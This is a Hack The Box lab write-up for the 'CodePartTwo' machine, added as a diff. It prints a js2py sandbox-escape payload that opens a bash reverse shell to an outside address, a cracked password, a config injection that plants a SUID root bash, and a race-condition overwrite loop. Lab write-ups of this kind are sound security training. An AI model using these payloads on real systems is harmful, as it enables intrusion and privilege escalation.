@@ -1,0 +1,145 @@
+---
+title: 'HTB - CodePartTwo'
+description: 'Penetration test report for the CodePartTwo machine on Hack The Box. Exploiting a critical PySandbox escape in js2py and leveraging a config race condition for privilege escalation.'
+date: 2026-01-15
+tags: ['writeup', 'htb', 'linux', 'easy', 'rce', 'privesc', 'python', 'race-condition']
+authors: ['kudaliar']
+draft: false
+---
+
+## Executive Summary
+
+**Target:** CodePartTwo (10.10.11.82)
+**Difficulty:** Easy
+**OS:** Linux
+
+This writeup details the complete exploitation chain of the **CodePartTwo** machine, from initial reconnaissance to obtaining root privileges. The attack path involved exploiting a critical RCE vulnerability in the `js2py` library to gain initial access, cracking a weak password for lateral movement, and finally leveraging a race condition in the `npbackup` service configuration to achieve root execution.
+
+| Category | Difficulty | User Flag | Root Flag |
+|----------|------------|-----------|-----------|
+| Linux Machine | Easy | `805dc84f**************************` | `b6041298**************************` |
+
+---
+
+## Attack Chain Visualization
+
+```mermaid
+graph TD
+    A[Attacker] -->|Port Scan| B(Reconnaissance)
+    B -->|Discover Web App| C{Web Enumeration}
+    C -->|Download Source| D[Code Analysis]
+    D -->|CVE-2024-28397| E[Initial Access (app)]
+    E -->|Dump Database| F[Crack Credentials]
+    F -->|SSH Login| G[User Access (marco)]
+    G -->|Analyze npbackup| H{Privilege Escalation}
+    H -->|Config Injection| I[Payload: SUID Bash]
+    I -->|Race Condition| J[Root Access]
+```
+
+---
+
+## 1. Reconnaissance
+
+### 1.1 Port Scanning
+An extensive Nmap scan revealed two open ports:
+- **22/tcp**: OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
+- **8000/tcp**: HTTP (Gunicorn 20.0.4)
+
+### 1.2 Web Enumeration
+The web application is a "Online Code Editor" allowing users to register, login, save, and run JavaScript code. User input is processed and executed on the backend.
+
+Critical endpoints discovered:
+- `/run_code`: Executes submitted JavaScript.
+- `/download`: Exposed source code (`app.zip`).
+
+---
+
+## 2. Vulnerability Analysis: Initial Access
+
+### 2.1 Source Code Review
+Analysis of the downloaded `app.py` revealed the usage of the `js2py` library to execute user-submitted JavaScript code.
+
+```python title="app.py"
+import js2py
+# ...
+@app.route('/run_code', methods=['POST'])
+def run_code():
+    code = request.form.get('code')
+    try:
+        result = js2py.eval_js(code) # VULNERABLE
+        return jsonify({'result': str(result)})
+    # ...
+```
+
+### 2.2 Vulnerability: CVE-2024-28397
+- **CVSS v3.1 Score**: **10.0** (Critical)
+
+The installed version of `js2py` is vulnerable to a sandbox escape that allows arbitrary Python code execution. By accessing the global object within the JavaScript context, we can import Python modules like `os` and execute system commands.
+
+### 2.3 Exploitation
+We constructed a payload to bypass the sandbox and spawn a reverse shell:
+```javascript
+let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.16.16/8001 0>&1'";
+var x = global.process.mainModule.constructor._load("os");
+x.system(cmd);
+```
+Sending this payload to `/run_code` granted us a shell as the `app` user.
+
+---
+
+## 3. Privilege Escalation: `app` -> `marco`
+
+### 3.1 Enumeration
+Upon checking the application directory, we found an SQLite database `users.db`. Dumping its content revealed user credentials.
+
+### 3.2 Credential Cracking
+- **Hash**: `a732d5e366f7b973762e6a6fd0614c0d`
+
+We used `john` with the `rockyou.txt` wordlist to crack the MD5 hash.
+- **Password**: `sweetangelbabylove`
+
+### 3.3 Lateral Movement
+Using the cracked password, we successfully logged in as the user `marco` via SSH.
+- **User Flag**: `805dc84f**************************`
+
+---
+
+## 4. Privilege Escalation: `marco` -> `root`
+
+### 4.1 Enumeration
+We identified a custom backup utility `npbackup` running periodically as `root`.
+Configuration details:
+- **Binary**: `/usr/local/bin/npbackup-cli`
+- **Default Config**: `/home/marco/npbackup.conf`
+- **Behavior**: The tool copies the config file to a temporary location (observed as `/tmp/a3/npbackup.conf` or `/dev/shm/npbackup.conf`) before processing it.
+
+### 4.2 Vulnerability: Insecure Config Handling & Command Injection
+- **CVSS v3.1 Score**: **7.0** (High)
+
+The `npbackup` tool allows defining `pre_exec_commands` in its configuration file, which are executed by the backup process (running as root). Since the configuration file is writable by `marco` and copied to a predictable location, it is susceptible to modification and Race Conditions.
+
+### 4.3 Exploitation
+We crafted a malicious `npbackup.conf` that:
+1.  Sets `minimum_backup_age: 0` to force an immediate backup run.
+2.  Sets `backup_opts` path to `/etc` (small/safe path).
+3.  Injects a command to create a SUID root shell in `pre_exec_commands`:
+
+```yaml title="npbackup.conf"
+pre_exec_commands: ["/bin/cp /bin/bash /home/marco/rootbash; /bin/chmod +s /home/marco/rootbash"]
+```
+
+**The Race Condition**:
+To ensure our malicious config was processed instead of the clean system one, we ran a loop to continuously overwrite the target config location:
+
+```bash
+while true; do cp /home/marco/npbackup.conf /dev/shm/npbackup.conf 2>/dev/null; done
+```
+
+### 4.4 Root Access
+When the `npbackup` service executed, it loaded our malicious configuration from `/dev/shm/npbackup.conf` and executed the `pre_exec_commands`, creating the SUID binary.
+
+We executed the binary to obtain the root flag:
+```bash
+/home/marco/rootbash -p -c "cat /root/root.txt"
+```
+- **Root Flag**: `b6041298**************************`
